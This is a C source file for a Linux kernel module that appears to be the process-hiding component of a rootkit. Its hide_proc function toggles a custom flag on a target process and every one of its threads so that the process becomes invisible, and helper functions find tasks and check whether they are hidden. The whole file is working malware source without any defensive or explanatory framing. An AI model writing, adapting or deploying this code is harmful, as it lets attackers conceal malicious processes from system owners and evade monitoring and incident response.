#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/ctype.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/limits.h>
#include <linux/sched/signal.h>

#include "proc.h"

int is_proc_invisible(pid_t pid);
int flag_tasks(pid_t pid, int set);

void hide_proc(pid_t pid) {
	if(is_proc_invisible(pid))
		flag_tasks(pid, 0);
	else
		flag_tasks(pid, 1);
}


int flag_tasks(pid_t pid, int set)
{
	int ret = 0;
	struct pid *p;

	rcu_read_lock();

	p = find_get_pid(pid);
	if (p) {
		struct task_struct *task = get_pid_task(p, PIDTYPE_PID);

		if (task) {
			struct task_struct *t = NULL;

			for_each_thread(task, t)
			{
				if (set)
					t->flags |= FLAG;
				else
					t->flags &= ~FLAG;

				ret++;
			}

			if (set)
				task->flags |= FLAG;
			else
				task->flags &= ~FLAG;

			put_task_struct(task);
		}
		put_pid(p);
	}

	rcu_read_unlock();
	return ret;
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *p = current;
	struct task_struct *ret = NULL;

	rcu_read_lock();
	for_each_process(p)
	{
		if (p->pid == pid) {
			get_task_struct(p);
			ret = p;
		}
	}
	rcu_read_unlock();

	return ret;
}

int is_proc_invisible(pid_t pid)
{
	struct task_struct *task;
	int ret = 0;

	if (!pid)
		return ret;

	task = find_task(pid);
	if (!task)
		return ret;

	if (is_task_invisible(task))
		ret = 1;

	put_task_struct(task);
	return ret;
}
